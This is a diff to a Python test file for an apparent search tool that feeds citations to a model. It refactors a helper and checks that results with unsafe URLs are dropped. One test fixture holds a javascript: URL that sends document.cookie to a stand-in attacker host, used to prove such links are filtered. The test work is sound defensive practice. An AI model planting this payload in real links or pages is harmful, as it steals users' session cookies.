@@ -4,8 +4,20 @@ import pytest
 
 from groundhog_mcp import search
 from groundhog_mcp.config import load_config
+from groundhog_mcp.search import SearchHit
 
 from .conftest import INVISIBLES, TAG_I, ZERO_WIDTH
+
+
+def _hit(url: str) -> SearchHit:
+    return {
+        "title": "T",
+        "url": url,
+        "snippet": "s",
+        "engine": "e",
+        "score": 1.0,
+        "published": None,
+    }
 
 
 def _cfg(**over):
@@ -128,16 +140,6 @@ async def test_a_dropped_hit_does_not_cost_a_result_slot(monkeypatch):
 async def test_non_http_scheme_hits_are_dropped(monkeypatch):
     # One backend enforced the scheme itself and the other did not, so a
     # `javascript:` or `file:` result could be returned to the model as a citation.
-    def _hit(url):
-        return {
-            "title": "T",
-            "url": url,
-            "snippet": "s",
-            "engine": "e",
-            "score": 1.0,
-            "published": None,
-        }
-
     async def _serp(query):
         return [
             _hit("javascript:fetch('https://evil.example/'+document.cookie)"),
@@ -153,16 +155,6 @@ async def test_non_http_scheme_hits_are_dropped(monkeypatch):
 async def test_a_hit_url_carrying_credentials_is_dropped(monkeypatch):
     # `user:pass@` in a citation is both a credential leak into model context and a
     # rule `check_url` already applies to everything we fetch.
-    def _hit(url):
-        return {
-            "title": "T",
-            "url": url,
-            "snippet": "s",
-            "engine": "e",
-            "score": 1.0,
-            "published": None,
-        }
-
     async def _serp(query):
         return [_hit("https://user:secret@ex.com/a"), _hit("https://ex.com/ok")]
 
@@ -171,18 +163,10 @@ async def test_a_hit_url_carrying_credentials_is_dropped(monkeypatch):
     assert [h["url"] for h in hits] == ["https://ex.com/ok"]
 
 
-async def test_a_hit_url_with_a_malformed_host_is_dropped(monkeypatch):
-    def _hit(url):
-        return {
-            "title": "T",
-            "url": url,
-            "snippet": "s",
-            "engine": "e",
-            "score": 1.0,
-            "published": None,
-        }
-
-    async def _serp(query):
+async def test_a_hit_url_with_a_malformed_host_is_dropped(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    async def _serp(query: str) -> list[SearchHit]:
         return [_hit("http://[::1/x"), _hit("https://ex.com/ok")]
 
     monkeypatch.setattr(search.serp, "search", _serp)
